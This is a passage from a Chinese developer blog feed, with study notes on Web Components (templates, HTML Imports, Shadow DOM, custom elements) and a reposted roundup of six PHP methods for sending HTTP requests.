class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> aTemplate = <span class="built_in">document</span>.querySelector(<span class="string">'#aTemplate'</span>),</span></div><div class="line"><span class="javascript">    container = <span class="built_in">document</span>.getElementById(<span class="string">"container"</span>),</span></div><div class="line"><span class="undefined">    templateContent = aTemplate.content,</span></div><div class="line"><span class="javascript">    activeContent = <span class="built_in">document</span>.importNode(templateContent, <span class="literal">true</span>); <span class="comment">//key</span></span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">    container.appendChild(activeContent);</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h2 id="HTML-Import"><a href="#HTML-Import" class="headerlink" title="HTML Import"></a>HTML Import</h2><p>可以像iframe一样,把外部的HTML嵌入页面<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"import"</span> <span class="attr">href</span>=<span class="string">"fileName.html"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>检测是否支持<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> isImportSupport = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> link = <span class="built_in">document</span>.createElement(<span class="string">'link'</span>);</div><div class="line">    <span class="keyword">return</span> <span class="string">'import'</span> <span class="keyword">in</span> link;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>访问被引入的文档(通过import属性)<br>=&gt; message.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>This is from another HTML file document.<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>=&gt; index.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"import"</span> <span class="attr">href</span>=<span class="string">"message.html"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">    (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></div><div class="line"><span class="javascript">        <span class="keyword">var</span> externalDocument = </span></div><div class="line"><span class="javascript">            <span class="built_in">document</span>.querySelector(<span class="string">'link[rel="import"]'</span>).import;</span></div><div class="line"><span class="javascript">        <span class="keyword">var</span> headerElement = externalDocument.querySelector(<span class="string">'h1'</span>);</span></div><div class="line"><span class="javascript"><span class="comment">//        document.body.appendChild(headerElement);</span></span></div><div class="line"><span class="javascript">        <span class="built_in">document</span>.body.appendChild(headerElement.cloneNode(<span class="literal">true</span>));</span></div><div class="line"><span class="undefined">    &#125;)();</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>原文这里也是用了<code>cloneNode</code><br>即为<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.body.appendChild(headerElement.cloneNode(<span class="literal">true</span>));</div></pre></td></tr></table></figure></p>
<p>但试验了一下好像直接<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.body.appendChild(headerElement);</div></pre></td></tr></table></figure></p>
<p>也是可以的</p>
<h2 id="Shadow-DOM"><a href="#Shadow-DOM" class="headerlink" title="Shadow DOM"></a>Shadow DOM</h2><p>为了防止防止外部文档影响到Web Component,比如</p>
<ul>
<li>文档样式表</li>
<li>文档的javascript代码</li>
<li>出现重复id</li>
</ul>
<p>Shadow DOM 相当于把web Component封装起来,不受外部作用域影响</p>
<p>检测是否<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> isShadowDOMSupported = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="string">'createShadowRoot'</span> <span class="keyword">in</span> <span class="built_in">document</span>.body</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h5 id="Shadow-tree"><a href="#Shadow-tree" class="headerlink" title="Shadow tree"></a>Shadow tree</h5><p>可以把一个Shadow tree 挂到某个DOM元素上,这个元素就作为宿主元素<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"aShadowHost"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="comment">&lt;!-- 挂载点 --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"selectorTemplate"</span>&gt;</span> <span class="comment">&lt;!-- 模板 可以clone,然后丢到shadow DOM 里--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="css">            <span class="selector-pseudo">:host</span> <span class="selector-tag">input</span>&#123;</span></div><div class="line"><span class="undefined">                background: lightyellow;</span></div><div class="line"><span class="undefined">            &#125;</span></div><div class="line"><span class="css">            <span class="selector-pseudo">:host</span> <span class="selector-class">.labelClass</span>&#123;</span></div><div class="line"><span class="undefined">                color: blue;</span></div><div class="line"><span class="undefined">            &#125;</span></div><div class="line"><span class="undefined">        </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">form</span>&gt;</span></div><div class="line">            ... 省略若干html</div><div class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">        (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></div><div class="line"><span class="javascript">            <span class="keyword">var</span> aShadowHost = <span class="built_in">document</span>.getElementById(<span class="string">'aShadowHost'</span>);</span></div><div class="line"><span class="javascript">            <span class="keyword">var</span> shadowRoot = aShadowHost.createShadowRoot(); <span class="comment">//重点,敲黑板,相当于给aShadowHost挂载了一颗Shadow Tree</span></span></div><div class="line"><span class="javascript">            <span class="keyword">var</span> TemplateContent = ... ; <span class="comment">//此处省略把`selectorTemplate`cloneNode出来的过程</span></span></div><div class="line"><span class="javascript">            shadowRoot.appendChild(TemplateContent); <span class="comment">//成功把模板挂到shadowRoot下面</span></span></div><div class="line"><span class="javascript">            <span class="comment">// 其实可以挂很多个shadow tree</span></span></div><div class="line"><span class="javascript">            <span class="comment">//现在的状况</span></span></div><div class="line"><span class="undefined">            /* div#aShadowHost</span></div><div class="line"><span class="undefined">             *  /=&gt; shadow-root</span></div><div class="line"><span class="undefined">             *      /=&gt; style</span></div><div class="line"><span class="undefined">             *      /=&gt; form</span></div><div class="line"><span class="undefined">             *  /=&gt; shadow-root 如果多createShadowRoot几次就能得到多个shadow DOM子树</span></div><div class="line"><span class="undefined">             *      /=&gt; ....</span></div><div class="line"><span class="undefined">             *  /=&gt; ....</span></div><div class="line"><span class="undefined">             */</span></div><div class="line"><span class="undefined">        &#125;)();</span></div><div class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h2 id="自定义元素"><a href="#自定义元素" class="headerlink" title="自定义元素"></a>自定义元素</h2><p>检测<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> isCustomElementSupportws = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="string">'registerElement'</span> <span class="keyword">in</span> <span class="built_in">document</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>大概过程,具体参考MDN<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> newObj = <span class="built_in">Object</span>.create(HTMLElement.prototype);</div><div class="line"><span class="built_in">Object</span>.defineProperties(newObj, &#123;</div><div class="line">    title: &#123;</div><div class="line">        writeable:<span class="literal">true</span></div><div class="line">    &#125;,</div><div class="line">    country: &#123;</div><div class="line">        writeable:<span class="literal">true</span>,</div><div class="line">        value: <span class="string">'India'</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;);</div><div class="line"><span class="comment">//定义生命周期方法(这个是不是就叫做钩子)</span></div><div class="line">newObj.createCallback = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">   <span class="comment">//Do-something </span></div><div class="line">&#125;</div><div class="line"><span class="comment">//注册元素</span></div><div class="line"><span class="keyword">var</span> newTag = <span class="built_in">document</span>.registerElement(<span class="string">'Tag-name'</span>, &#123;</div><div class="line">    prototype: newObj   <span class="comment">// 把我们前面辛辛苦苦create出来的obj注册成功了</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>使用<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">Tag-name</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">Tag-name</span>&gt;</span></div></pre></td></tr></table></figure></p>
<blockquote>
<p>生命周期: created =&gt; attached =&gt; detached =&gt; attributeChanged</p>
</blockquote>
<h2 id="节点分布"><a href="#节点分布" class="headerlink" title="节点分布"></a>节点分布</h2><p>两种插入点</p>
<h3 id="content"><a href="#content" class="headerlink" title="content"></a>content</h3><p>对Shadow Host的子节点占位,反向映射Shadow Host的子节点</p>
<blockquote>
<p>这个不太好理解,看他这个例子</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">```</div><div class="line"></div><div class="line">### shadow</div><div class="line">shadow插入点是Shadow Tree的占位符,反向映射了Shadow Tree中的元素</div><div class="line">&gt; 哇 这个也不太好理解</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">### 然后发现了一个完整的Demo</div><div class="line">&gt; 抄完这个Demo就去写作业</div><div class="line">```html</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">    &lt;head&gt;</div><div class="line">        &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</div><div class="line">        &lt;title&gt;Demo&lt;/title&gt;</div><div class="line">        &lt;style&gt;</div><div class="line">            header-element:unresolved&#123;</div><div class="line">                visibility:hidden;</div><div class="line">            &#125;</div><div class="line">            header-element:unresolved:after&#123;</div><div class="line">                content: &apos;Registering Element...&apos;;</div><div class="line">                color: red;</div><div class="line">                visibility:visible;</div><div class="line">            &#125;</div><div class="line">        &lt;/style&gt;</div><div class="line">    &lt;/head&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">        &lt;template id=&quot;headerTemplate&quot;&gt;</div><div class="line">            &lt;style&gt;</div><div class="line">                :host&#123;</div><div class="line">                    text-transform:lowercase;</div><div class="line">                &#125;</div><div class="line">                :host::shadow h1&#123;</div><div class="line">                    color:orange;</div><div class="line">                &#125;</div><div class="line">                :host::content b&#123;</div><div class="line">                    color:blue;</div><div class="line">                &#125;</div><div class="line">            &lt;/style&gt;</div><div class="line">            &lt;h1&gt; Hello &lt;content&gt;&lt;/content&gt; &lt;/h1&gt;</div><div class="line">        &lt;/template&gt;</div><div class="line">        &lt;script&gt;</div><div class="line">            (function() &#123;</div><div class="line">                var objectPrototype = Object.create(HTMLElement.prototype);</div><div class="line">                objectPrototype.createdCallback = function() &#123;</div><div class="line">                    var shadow = this.createShadowRoot(),</div><div class="line">                        templateContent = document.querySelector(&apos;#headerTemplate&apos;).content;</div><div class="line">                    var templateNodes = document.importNode(templateContent, true);</div><div class="line">                    shadow.appendChild(templateNodes); // 成功挂载,要累死我了</div><div class="line">                &#125;;</div><div class="line">                window.setTimeout(function() &#123;</div><div class="line">                    document.registerElement(&apos;header-element&apos;, &#123;</div><div class="line">                        prototype: objectPrototype</div><div class="line">                    &#125;) //延时注册</div><div class="line">                &#125;, 3000);</div><div class="line">            &#125;)();</div><div class="line">        &lt;/script&gt;</div><div class="line">        &lt;header-element&gt;</div><div class="line">            &lt;b&gt;Web Component&lt;/b&gt;</div><div class="line">        &lt;/header-element&gt;</div><div class="line">    &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>心都碎了,说好的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">:host::shadow h1&#123;</div><div class="line">    color:orange;</div><div class="line">&#125;</div><div class="line">:host::content b&#123;</div><div class="line">    color:blue;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这样子.应该是<code>Hello</code>橙色,<code>web Component</code>蓝色啊<br>实际上运行结果是<br>firefox跑不出来<br>chrome上有加载效果,但加载出来都是橙色的,并且警告我<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">::shadow pseudo-element is deprecated. See https://www.chromestatus.com/features/6750456638341120 for more details.</div></pre></td></tr></table></figure></p>
<h2 id="后来"><a href="#后来" class="headerlink" title="后来"></a>后来</h2><p>书的后几章讲了一些具体的实现组件化web的库<br>有<code>Polymer JS</code>, <code>Mozilla Brick</code>, <code>Bosonic</code>, <code>ReactJS</code></p>
<p>喔,,以后学一下<code>ReactJS</code>,稍微看了下,总感觉像是在拼接字符串</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/w3c/webcomponents" target="_blank" rel="external">https://github.com/w3c/webcomponents</a><br><a href="http://w3c.github.io/webcomponents/spec/shadow/" target="_blank" rel="external">http://w3c.github.io/webcomponents/spec/shadow/</a><br><a href="https://www.toobug.net/article/what_is_shadow_dom.html" target="_blank" rel="external">https://www.toobug.net/article/what_is_shadow_dom.html</a><br><a href="https://developer.mozilla.org/zh-cn/docs/web/web_components" target="_blank" rel="external">https://developer.mozilla.org/zh-cn/docs/web/web_components</a></p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[php发http请求]]></title>
      <url>/2017/05/25/php%E5%8F%91http%E8%AF%B7%E6%B1%82/</url>
      <content type="html"><![CDATA[<p>喔,突然想到,php如何发送http请求,好吧,好蠢啊<br>因为一直感觉php更像是专门的server<br>不像是py和node那样,很中</p>
<p>然后转载一波来自网络的内容,这个被转了很多次,我也不知道来源哪里了</p>
<h2 id="神tm六中方法"><a href="#神tm六中方法" class="headerlink" title="神tm六中方法"></a>神tm六中方法</h2><p>方法1: 用file_get_contents 以get方式获取内容：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$url=<span class="string">'http://www.jb51.net/'</span>;</div><div class="line">$html = file_get_contents($url);</div><div class="line"><span class="keyword">echo</span> $html;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>方法2: 用fopen打开url, 以get方式获取内容：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$fp = fopen($url, <span class="string">'r'</span>);</div><div class="line">stream_get_meta_data($fp);</div><div class="line"><span class="keyword">while</span>(!feof($fp)) &#123;</div><div class="line">$result .= fgets($fp, <span class="number">1024</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> <span class="string">"url body: $result"</span>;</div><div class="line">fclose($fp);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>方法3：用file_get_contents函数,以post方式获取url<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$data = <span class="keyword">array</span> (<span class="string">'foo'</span> =&gt; <span class="string">'bar'</span>);</div><div class="line">$data = http_build_query($data);</div><div class="line"></div><div class="line">$opts = <span class="keyword">array</span> (</div><div class="line">    <span class="string">'http'</span> =&gt; <span class="keyword">array</span> (</div><div class="line">    <span class="string">'method'</span> =&gt; <span class="string">'POST'</span>,</div><div class="line">    <span class="string">'header'</span>=&gt; <span class="string">"Content-type: application/x-www-form-urlencodedrn"</span>.<span class="string">"Content-Length: "</span>.strlen($data).<span class="string">"rn"</span>,</div><div class="line">    <span class="string">'content'</span> =&gt; $data</div><div class="line">    )</div><div class="line">);</div><div class="line"></div><div class="line">$context = stream_context_create($opts);</div><div class="line">$html = file_get_contents(<span class="string">'http://localhost/e/admin/test.html'</span>, <span class="keyword">false</span>, $context);</div><div class="line"></div><div class="line"><span class="keyword">echo</span> $html;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>方法4：用fsockopen函数打开url，以get方式获取完整的数据，包括header和body,fsockopen需要 PHP.ini 中 allow_url_fopen 选项开启<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_url</span> <span class="params">($url,$cookie=false)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">$url = parse_url($url);</div><div class="line">$query = $url[path].<span class="string">"?"</span>.$url[query];</div><div class="line"><span class="keyword">echo</span> <span class="string">"Query:"</span>.$query;</div><div class="line">$fp = fsockopen( $url[host], $url[port]?$url[port]:<span class="number">80</span> , $errno, $errstr, <span class="number">30</span>);</div><div class="line"><span class="keyword">if</span> (!$fp) &#123;</div><div class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">$request = <span class="string">"GET $query HTTP/1.1\r\n"</span>;</div><div class="line">$request .= <span class="string">"Host: $url[host]\r\n"</span>;</div><div class="line">$request .= <span class="string">"Connection: Close\r\n"</span>;</div><div class="line"><span class="keyword">if</span>($cookie) $request.=<span class="string">"Cookie:  $cookie\r\n"</span>;</div><div class="line">$request.=<span class="string">"\r\n"</span>;</div><div class="line">fwrite($fp,$request);</div><div class="line"><span class="keyword">while</span>(!@feof($fp)) &#123;</div><div class="line">$result .= @fgets($fp, <span class="number">1024</span>);</div><div class="line">&#125;</div><div class="line">fclose($fp);</div><div class="line"><span class="keyword">return</span> $result;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//获取url的html部分，去掉header</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetUrlHTML</span><span class="params">($url,$cookie=false)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">$rowdata = get_url($url,$cookie);</div><div class="line"><span class="keyword">if</span>($rowdata)</div><div class="line">&#123;</div><div class="line">$body= stristr($rowdata,<span class="string">"rnrn"</span>);</div><div class="line">$body=substr($body,<span class="number">4</span>,strlen($body));</div><div class="line"><span class="keyword">return</span> $body;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>我绝对不会用这种超级长的</p>
<p>方法5：用fsockopen函数打开url，以POST方式获取完整的数据，包括header和body<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">HTTP_Post</span><span class="params">($URL,$data,$cookie, $referrer=<span class="string">""</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"></div><div class="line"><span class="comment">// parsing the given URL</span></div><div class="line">$URL_Info=parse_url($URL);</div><div class="line"></div><div class="line"><span class="comment">// Building referrer</span></div><div class="line"><span class="keyword">if</span>($referrer==<span class="string">""</span>) &#123;<span class="comment">// if not given use this script as referrer</span></div><div class="line">    $referrer=<span class="string">"111"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// making string from $data</span></div><div class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)</div><div class="line">$values[]=<span class="string">"$key="</span>.urlencode($value);</div><div class="line">$data_string=implode(<span class="string">"&amp;"</span>,$values);</div><div class="line"></div><div class="line"><span class="comment">// Find out which port is needed – if not given use standard (=80)</span></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($URL_Info[<span class="string">"port"</span>]))</div><div class="line">$URL_Info[<span class="string">"port"</span>]=<span class="number">80</span>;</div><div class="line"></div><div class="line"><span class="comment">// building POST-request:</span></div><div class="line">$request.=<span class="string">"POST "</span>.$URL_Info[<span class="string">"path"</span>].<span class="string">" HTTP/1.1\n"</span>;</div><div class="line">$request.=<span class="string">"Host: "</span>.$URL_Info[<span class="string">"host"</span>].<span class="string">"\n"</span>;</div><div class="line">$request.=<span class="string">"Referer: "</span>.<span class="string">"$referer\n"</span>;</div><div class="line">$request.=<span class="string">"Content-type: "</span>.<span class="string">"application/x-www-form-urlencoded\n"</span>;</div><div class="line">$request.=<span class="string">"Content-length: "</span>.strlen($data_string).<span class="string">"\n"</span>;</div><div class="line">$request.=<span class="string">"Connection: "</span>.<span class="string">"close\n"</span>;</div><div class="line"></div><div class="line">$request.=<span class="string">"Cookie:  $cookie\n"</span>;</div><div class="line"></div><div class="line">$request.=<span class="string">"\n"</span>;</div><div class="line">$request.=$data_string.<span class="string">"\n"</span>;</div><div class="line"></div><div class="line">$fp = fsockopen($URL_Info[<span class="string">"host"</span>],$URL_Info[<span class="string">"port"</span>]);</div><div class="line">fputs($fp, $request);</div><div class="line"><span class="keyword">while</span>(!feof($fp)) &#123;</div><div class="line">$result .= fgets($fp, <span class="number">1024</span>);</div><div class="line">&#125;</div><div class="line">fclose($fp);</div><div class="line"></div><div class="line"><span class="keyword">return</span> $result;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>方法6:使用curl库，使用curl库之前，可能需要查看一下php.ini是否已经打开了curl扩展<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$ch = curl_init();</div><div class="line">$timeout = <span class="number">5</span>;</div><div class="line">curl_setopt ($ch, CURLOPT_URL, <span class="string">'http://www.jb51.net/'</span>);</div><div class="line">curl_setopt ($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);</div><div class="line">$file_contents = curl_exec($ch);</div><div class="line">curl_close($ch);</div><div class="line"></div><div class="line"><span class="keyword">echo</span> $file_contents;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<blockquote>
<p>恕我直言,,,还是file_get_contents比较靠谱<br>还有你们转载的时候就没有发现,,,,<code>\n</code>和<code>\r</code>都丢了<code>\\</code><br>改掉好多,懒得改了,应该都是\r\n吧后边的,,蒸米都是只有\n,感觉然后还要改</p>
</blockquote>
<h2 id="然后想"><a href="#然后想" class="headerlink" title="然后想"></a>然后想</h2><p>node里有<code>request</code>包 =&gt; <a href="https://github.com/request/request" target="_blank" rel="external">https://github.com/request/request</a><br>py里有<code>requests</code>库 =&gt; <a href="https://github.com/kennethreitz/requests" target="_blank" rel="external">https://github.com/kennethreitz/requests</a></p>
<p>然后上gayhub上搜了一下,诶?php也有一个<br><a href="https://github.com/rmccue/Requests" target="_blank" rel="external">https://github.com/rmccue/Requests</a></p>
<p>然后看下<br>好了.再看,再催我就要亲亲抱抱举高高了</p>
]]></content>
      
        
        <tags>
            
            <tag> request </tag>
            
            <tag> php </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[url]]></title>
      <url>/2017/05/25/url/</url>
